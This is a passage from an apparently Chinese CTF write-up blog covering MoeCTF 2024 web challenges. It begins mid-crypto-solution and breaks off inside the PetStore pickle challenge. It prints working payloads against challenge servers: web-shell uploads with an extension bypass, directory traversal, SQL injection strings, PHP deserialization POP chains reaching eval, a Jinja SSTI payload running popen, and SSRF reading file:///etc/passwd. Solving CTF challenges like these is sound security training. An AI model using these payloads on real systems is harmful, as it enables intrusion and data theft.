class="hljs-number">301157372202750742637385626243753030679</span>, <span class="hljs-number">40886620741595313792996852647181029560</span>, <span class="hljs-number">253361171396328884567373946949359324229</span>, <span class="hljs-number">50071128101197582041162516700015376269</span>, <span class="hljs-number">106002417001877546867386840932652850816</span>, <span class="hljs-number">224086864980106045542532841236299648038</span>, <span class="hljs-number">42103921294151508500634063253613482845</span>, <span class="hljs-number">49777138159264482913170680298952908154</span>, <span class="hljs-number">24324534484842395819609478778764950811</span>, <span class="hljs-number">204106593629836179932302789646808274058</span>, <span class="hljs-number">266707066043760482642609614924857456238</span>, <span class="hljs-number">18723835069315957900598472598907945204</span>, <span class="hljs-number">244338819469013923747256697307964210342</span>, <span class="hljs-number">36296287172854997655950896217230267111</span>, <span class="hljs-number">292888671179451539882069138267865661448</span>, <span class="hljs-number">287111415651274690627399445990831389362</span>, <span class="hljs-number">79940439572496625318602146625920961720</span>, <span class="hljs-number">288270505176661814341807462681727466925</span>, <span class="hljs-number">153921178962139214138689743179633342125</span>, <span class="hljs-number">263564317934507756965522450042219801757</span>, <span class="hljs-number">197993323684501153884855839599466707355</span>, <span class="hljs-number">72143993205715719344183507132882267579</span>, <span class="hljs-number">67511075584002491895239101559049103979</span>, <span class="hljs-number">231396344630318648781207380069016790960</span>, <span class="hljs-number">268490084177254392405211695854127631350</span>, <span class="hljs-number">45968181401712207064942095991325993181</span>, <span class="hljs-number">34472329776995578971329318400545600788</span>, <span class="hljs-number">112967316661320871429337739209994987784</span>, <span class="hljs-number">209508577387521479468956337084132598710</span>, <span class="hljs-number">194445696189141465862938111222574992064</span>, <span class="hljs-number">229942079198360020568341753187100646148</span>, <span class="hljs-number">47944382795398541172186729027517882654</span>, <span class="hljs-number">54806201653083974379270761512143387910</span>, <span class="hljs-number">93457347627015900562505045196097224001</span>, <span class="hljs-number">152033139738914238723733340538181549419</span>, <span class="hljs-number">123719026823969669345162603978875451754</span>, <span class="hljs-number">154704533151410142607151617227929824563</span>, <span class="hljs-number">32428281285686815618553795197210513625</span>, <span class="hljs-number">265229864831280807254743597731258298440</span>, <span class="hljs-number">14904705423314872103792141735779112532</span>, <span class="hljs-number">177442398230615511669857060547212895616</span>, <span class="hljs-number">144918716871520627851549439448066637518</span>, <span class="hljs-number">203019416536984157536348865479415073573</span>, <span class="hljs-number">288452420706913930307744155709559750006</span>, <span class="hljs-number">282516471994395201735206793889605510595</span>, <span class="hljs-number">150722332251745138694381051866105655391</span>, <span class="hljs-number">234504581837296595003379465512031425988</span>, <span class="hljs-number">44178766618576668748878202507789103195</span>, <span class="hljs-number">217129489675072754441642067295058817201</span>, <span class="hljs-number">245087939287551829934600756568137757979</span>, <span class="hljs-number">240954534396950014938672406581264782638</span>]<br><br>decrypted_flag = decrypt_flag(ciphertext, p, a)<br><span class="hljs-built_in">print</span>(decrypted_flag)<br></code></pre></td></tr></table></figure>
<h1 id="web渗透测试与审计"><a class="markdownIt-Anchor" href="#web渗透测试与审计"></a> Web渗透测试与审计</h1>
<h2 id="web渗透测试与审计入门指北"><a class="markdownIt-Anchor" href="#web渗透测试与审计入门指北"></a> Web渗透测试与审计入门指北</h2>
<p>利用phpstudy进行搭建，得到flag</p>
<p><img src="/../../images/moectf/moectf2024/web%E5%85%A5%E9%97%A8.png" srcset="/img/loading.gif" lazyload alt="web入门"></p>
<h2 id="弗拉格之地的入口"><a class="markdownIt-Anchor" href="#弗拉格之地的入口"></a> 弗拉格之地的入口</h2>
<p>进入题目，hint是爬虫，联想到robots.txt，打开得到<code>/webtutorEntry.php</code>,进入页面得到flag</p>
<p><strong>moectf{CONGr@Tu14TioN-foR-KNOwlNG-ROBOtS_txT10e7d}</strong></p>
<h2 id="ez_http"><a class="markdownIt-Anchor" href="#ez_http"></a> ez_http</h2>
<img src="../../images/moectf/moectf2024/ez_http1.png" srcset="/img/loading.gif" lazyload alt="ez_http1" style="zoom:50%;">
<p><img src="../../images/moectf/moectf2024/ez_http2.png" srcset="/img/loading.gif" lazyload alt="ez_http2"></p>
<p><img src="../../images/moectf/moectf2024/ez_http3.png" srcset="/img/loading.gif" lazyload alt="ez_http3"></p>
<p><img src="../../images/moectf/moectf2024/ez_http4.png" srcset="/img/loading.gif" lazyload alt="ez_http4"></p>
<p><strong>moectf{y0u-4RE_ReA1lY-re@LlY_verY_c1EVEr!!!20ed}</strong></p>
<h2 id="垫刀之路01-moectf启动"><a class="markdownIt-Anchor" href="#垫刀之路01-moectf启动"></a> 垫刀之路01: MoeCTF？启动！</h2>
<p>正常流程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> / -&gt;<span class="hljs-built_in">cat</span> /flag <span class="hljs-comment">#提示在环境里 -&gt;输入env</span><br></code></pre></td></tr></table></figure>
<h2 id="垫刀之路02-普通的文件上传"><a class="markdownIt-Anchor" href="#垫刀之路02-普通的文件上传"></a> 垫刀之路02: 普通的文件上传</h2>
<p>提示和01一样应该也在env里</p>
<p>传个一句话木马，然后打开env即可</p>
<h2 id="垫刀之路03-这是一个图床"><a class="markdownIt-Anchor" href="#垫刀之路03-这是一个图床"></a> 垫刀之路03: 这是一个图床</h2>
<p>加了图片限制，写一个一句话，末尾改成jpg，抓包再把jpg改成php，执行system(‘env’);就行了</p>
<h2 id="垫刀之路04-一个文件浏览器"><a class="markdownIt-Anchor" href="#垫刀之路04-一个文件浏览器"></a> 垫刀之路04: 一个文件浏览器</h2>
<p>考察的知识点是目录遍历。简单的翻了一下不在目前的目录下通过<code>../</code>往上查找,(需要url编码),找到flag那一层，进去提示不在该文件下</p>
<p>根据moejail_lv1的提示猜测在tmp的目录下,里面有flag，得到答案。</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?path=../../../..//tmp/flag<br></code></pre></td></tr></table></figure>
<h2 id="垫刀之路05-登陆网站"><a class="markdownIt-Anchor" href="#垫刀之路05-登陆网站"></a> 垫刀之路05: 登陆网站</h2>
<p>先想到是尝试爆破的，突然下面跳出以前sql注入的记录</p>
<p>试了一下就出来了，进行了简答的截取绕过</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">a&#x27; or 1=1 #<br></code></pre></td></tr></table></figure>
<h2 id="垫刀之路06-pop-base-mini-moe"><a class="markdownIt-Anchor" href="#垫刀之路06-pop-base-mini-moe"></a> 垫刀之路06: pop base mini moe</h2>
<p>直接上wp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$evil</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>= <span class="hljs-string">&#x27;system&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$exp</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><br><span class="hljs-variable">$serialized_data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;?data=&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$serialized_data</span>) ;<br></code></pre></td></tr></table></figure>
<p>这里微调一下代码，<code>$a</code>前面的private需要改成public，要不然调用不了<code>$a</code>.</p>
<h2 id="垫刀之路07-泄漏的密码"><a class="markdownIt-Anchor" href="#垫刀之路07-泄漏的密码"></a> 垫刀之路07: 泄漏的密码</h2>
<p>考察的Flask，得到pin进入console里面</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;os.listdir()<br>[<span class="hljs-string">&#x27;__pycache__&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;app.py&#x27;</span>, <span class="hljs-string">&#x27;getPIN.py&#x27;</span>, <span class="hljs-string">&#x27;static&#x27;</span>, <span class="hljs-string">&#x27;templates&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-built_in">print</span>(f.read().strip())<br>moectf&#123;DONT_usIng-fLasK_6y_DE6UG_MOd_aNd-le4k-YOuR_p1nb&#125;<br></code></pre></td></tr></table></figure>
<h2 id="静态网页"><a class="markdownIt-Anchor" href="#静态网页"></a> 静态网页</h2>
<p>这题需要抓包看回显，orz我之前一直在看前端</p>
<p>看/api/get/?id=1-53可以得到具体的php</p>
<p>进去是一个MD5绕过</p>
<p>原来想着自绕过的，但是没有办法</p>
<p>后来直接a=0a，b[0a]=md5(0a)即可绕过，思路没转过来</p>
<h2 id="whos-blog"><a class="markdownIt-Anchor" href="#whos-blog"></a> who’s blog?</h2>
<p>fenjing一把梭得到答案</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=&#123;&#123;cycler.next.__globals__.__builtins__.__import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;env&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;;<br></code></pre></td></tr></table></figure>
<h2 id="proveyourlove"><a class="markdownIt-Anchor" href="#proveyourlove"></a> ProveYourLove</h2>
<p>方法1：抓包，发包得到flag</p>
<p><img src="/../../images/moectf/moectf2024/love1.png" srcset="/img/loading.gif" lazyload alt="love1"></p>
<p><img src="/../../images/moectf/moectf2024/love2.png" srcset="/img/loading.gif" lazyload alt="love2"></p>
<p>方法2：不会第一种可以手动删cookie，慢慢按</p>
<p>方法3：我做的时候没想到发包，在对应前端检测的地方打断点控制台绕过了，不推荐</p>
<h2 id="弗拉格之地的挑战"><a class="markdownIt-Anchor" href="#弗拉格之地的挑战"></a> 弗拉格之地的挑战</h2>
<p>第0层：直接进/flag1ab.html</p>
<p>第一层：看源码得到提示和下一层</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--flag1: bW9lY3Rm--&gt;</span><br><span class="hljs-comment">&lt;!--下一步：/flag2hh.php--&gt;</span><br></code></pre></td></tr></table></figure>
<p>第二层：如图所示</p>
<p><img src="/../../images/moectf/moectf2024/%E6%8C%91%E6%88%98.png" srcset="/img/loading.gif" lazyload alt="挑战"></p>
<table>
<thead>
<tr>
<th>flag2</th>
<th>e0FmdEV</th>
</tr>
</thead>
<tbody>
<tr>
<td>nextpage</td>
<td>/flag3cad.php</td>
</tr>
</tbody>
</table>
<p>第三层:</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=a<br><span class="hljs-attribute">b</span>=a<br>cookie:<span class="hljs-attribute">verify</span>=admin<br></code></pre></td></tr></table></figure>
<p><code>flag3: yX3RoMXN</code></p>
<p><code>/flag4bbc.php</code></p>
<p>第四层：</p>
<p>控制台手动触发打断点</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">var</span> <span class="hljs-keyword">event</span> = <span class="hljs-keyword">new</span> MouseEvent(<span class="hljs-string">&#x27;click&#x27;</span>, &#123;<br>    <span class="hljs-string">&#x27;view&#x27;</span>: window,<br>    <span class="hljs-string">&#x27;bubbles&#x27;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&#x27;cancelable&#x27;</span>: <span class="hljs-literal">true</span><br>&#125;);<br><br><span class="hljs-keyword">var</span> button = document.getElementById(<span class="hljs-string">&quot;scope&quot;</span>).getElementsByTagName(<span class="hljs-string">&quot;button&quot;</span>)[<span class="hljs-number">0</span>];<br>button.id = <span class="hljs-number">9</span>; <span class="hljs-comment">// 首先将其ID设置为9</span><br>button.dispatchEvent(<span class="hljs-keyword">event</span>); <span class="hljs-comment">// 手动触发点击事件</span><br></code></pre></td></tr></table></figure>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">fla<span class="hljs-name">g4</span>: fdFVUMHJ<br>前往：/fla<span class="hljs-name">g5</span>sxr.php<br></code></pre></td></tr></table></figure>
<p>第五层：</p>
<p>提示框输入相应的内容，控制台输入content=‘aaa’，对应内容打断点</p>
<p>flag5: fSV90aDF</p>
<p>第六层：?moe=FLAG</p>
<p>post:moe=1</p>
<p>flag6: rZV9VX2t</p>
<p>第七层：</p>
<p>what=system(‘cat /f*’);</p>
<p>得到flag：rbm93X1dlQn0=</p>
<p>最后七层的flag拼接base64得到答案</p>
<p>bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0=</p>
<p><strong>moectf{AftEr_th1s_tUT0r_I_th1ke_U_kknow_WeB}</strong></p>
<h2 id="moe-pop"><a class="markdownIt-Anchor" href="#moe-pop"></a> moe pop</h2>
<p>先上源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class000</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$payl0ad</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$what</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;payl0ad === <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;FAILED TO ATTACK&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;what;<br>        <span class="hljs-variable">$a</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class001</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$payl0ad</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a-&gt;payload = <span class="hljs-variable language_">$this</span>-&gt;payl0ad;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class002</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$sec</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$b</span>(<span class="hljs-variable language_">$this</span>-&gt;sec);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dangerous</span>(<span class="hljs-params"><span class="hljs-variable">$whaattt</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$whaattt</span>-&gt;<span class="hljs-title function_ invoke__">evvval</span>(<span class="hljs-variable">$this</span>-&gt;sec);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class003</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mystr</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evvval</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;mystr;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>进行简单的代码审计，从后往前推</p>
<p>class003有eval函数可以进行利用,class002中调用dangerous函数可以利用拼接，想引用dangerous可以给class001的payl0ad进行赋值利用a来new一个class002,要使用invoke函数的话，可以看class000,首先令payl0ad=000,成功正常的，成功给what赋值new class001</p>
<p>大题的思路就是这样正推的话直接上payload，为了连接起来，部分内容需要修改成public</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> class000;<br><span class="hljs-variable">$exp</span>-&gt;what=<span class="hljs-keyword">new</span> class001;<br><span class="hljs-variable">$exp</span>-&gt;what-&gt;payl0ad=<span class="hljs-string">&#x27;dangerous&#x27;</span>;<br><span class="hljs-variable">$exp</span>-&gt;what-&gt;a=<span class="hljs-keyword">new</span> class002;<br><span class="hljs-variable">$exp1</span>=<span class="hljs-keyword">new</span> class003;<br><span class="hljs-variable">$exp1</span>-&gt;mystr=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br><span class="hljs-variable">$exp</span>-&gt;what-&gt;a-&gt;sec = <span class="hljs-variable">$exp1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure>
<p>payl0ad和sec我都改成public了，最后可以在phpinfo里面找到flag,ctrl+f搜索moe</p>
<h2 id="勇闯铜人阵"><a class="markdownIt-Anchor" href="#勇闯铜人阵"></a> 勇闯铜人阵</h2>
<p>😋之前自己敲完一个代码之后就了解了一些基础了，晚上敲一会出来了，自己代码能力还是要练一下的,关键点可能就是session保持持续会话，我第一次尝试的时候没用到session，第二次是代码逻辑问题</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br>url = <span class="hljs-string">&#x27;http://127.0.0.1:59353/&#x27;</span><br>session = requests.Session()<br>response = session.get(url)<br>post_data = &#123;<span class="hljs-string">&#x27;player&#x27;</span>: <span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-string">&#x27;direct&#x27;</span>: <span class="hljs-string">&quot;弟子明白&quot;</span>&#125;<br>post_response = session.post(url, data=post_data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_direction</span>(<span class="hljs-params">number</span>):<br>    directions = &#123;<br>        <span class="hljs-number">1</span>: <span class="hljs-string">&quot;北方&quot;</span>,<br>        <span class="hljs-number">2</span>: <span class="hljs-string">&quot;东北方&quot;</span>,<br>        <span class="hljs-number">3</span>: <span class="hljs-string">&quot;东方&quot;</span>,<br>        <span class="hljs-number">4</span>: <span class="hljs-string">&quot;东南方&quot;</span>,<br>        <span class="hljs-number">5</span>: <span class="hljs-string">&quot;南方&quot;</span>,<br>        <span class="hljs-number">6</span>: <span class="hljs-string">&quot;西南方&quot;</span>,<br>        <span class="hljs-number">7</span>: <span class="hljs-string">&quot;西方&quot;</span>,<br>        <span class="hljs-number">8</span>: <span class="hljs-string">&quot;西北方&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> directions.get(number, <span class="hljs-string">&quot;无效的方向&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract</span>(<span class="hljs-params">html_content</span>):<br>    tag = BeautifulSoup(html_content, <span class="hljs-string">&#x27;html.parser&#x27;</span>).find(<span class="hljs-string">&#x27;h1&#x27;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;status&#x27;</span>)<br>    <span class="hljs-keyword">return</span> tag.text <span class="hljs-keyword">if</span> tag <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;状态未找到&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_numbers</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">int</span>(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&#x27;\d+&#x27;</span>, text)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-comment"># 提取状态文本</span><br>    status_text = extract(post_response.text)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;状态: <span class="hljs-subst">&#123;status_text&#125;</span>&quot;</span>)<br><br>    numbers = extract_numbers(status_text)<br>    count = <span class="hljs-built_in">len</span>(numbers)<br><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        ans = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;get_direction(numbers[<span class="hljs-number">0</span>])&#125;</span>&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        ans = <span class="hljs-string">&quot;，&quot;</span>.join([<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;get_direction(num)&#125;</span>一个&quot;</span> <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> numbers])<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;方向: <span class="hljs-subst">&#123;ans&#125;</span>&quot;</span>)<br><br>    payload = &#123;<span class="hljs-string">&#x27;player&#x27;</span>: <span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-string">&#x27;direct&#x27;</span>: ans&#125;<br>    post_response = session.post(url, data=payload)<br><br>    status_text = extract(post_response.text)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;新的状态: <span class="hljs-subst">&#123;status_text&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
<h2 id="电院_backend"><a class="markdownIt-Anchor" href="#电院_backend"></a> 电院_Backend</h2>
<p>过了一阵子才写，其实就是简单的sql注入，只是不怎么遇到sql的题目，所以也就不怎么会写了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">test@example.com&#x27; UNION SELECT null, null, null -- <br></code></pre></td></tr></table></figure>
<p>进行绕过得到flag</p>
<h2 id="imagecloud前置"><a class="markdownIt-Anchor" href="#imagecloud前置"></a> ImageCloud前置</h2>
<p>其实应该算在ssrf里面吧，利用<code>?url=file:///etc/passwd</code>,读取到flag</p>
<h2 id="imagecloud"><a class="markdownIt-Anchor" href="#imagecloud"></a> ImageCloud</h2>
<p>一开始尝试了图片一句话和vps外带执行命令，完全就是逻辑方向错了。</p>
<p>根据hint的提示给的是损坏的，但是容器是好的，再细看app2.py的代码（我一开始就没看</p>
<p>可以得出其实容器开了两个端口？利用**<code>?url=http://127.0.0.1:xxxx/image/flag.jpg</code>**，然后结合bp快速扫一下5001-6000的端口</p>
<p>就找到flag.jpg所在位置，图片上有flag</p>
<p><img src="/../../images/moectf/moectf2024/cloud.png" srcset="/img/loading.gif" lazyload alt="cloud"></p>
<h2 id="petstore复现"><a class="markdownIt-Anchor" href="#petstore复现"></a> PetStore(复现)</h2>
<p>是个pickle的题目，写的时候没有往内存马那边想后来请教学长告诉了可以直接打个🐎进去，因为种种原因直到结束都没再写，复现一下。以下是一开始的个人思路。</p>
<p>关键的代码定位是import_pet部分的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">import_pet</span>(<span class="hljs-params">self, serialized_pet</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">try</span>:<br>        pet_data = base64.b64decode(serialized_pet)<br>        pet = pickle.loads(pet_data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(pet, Pet):<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.pets:<br>                <span class="hljs-keyword">if</span> i.uuid == pet.uuid:<br>                    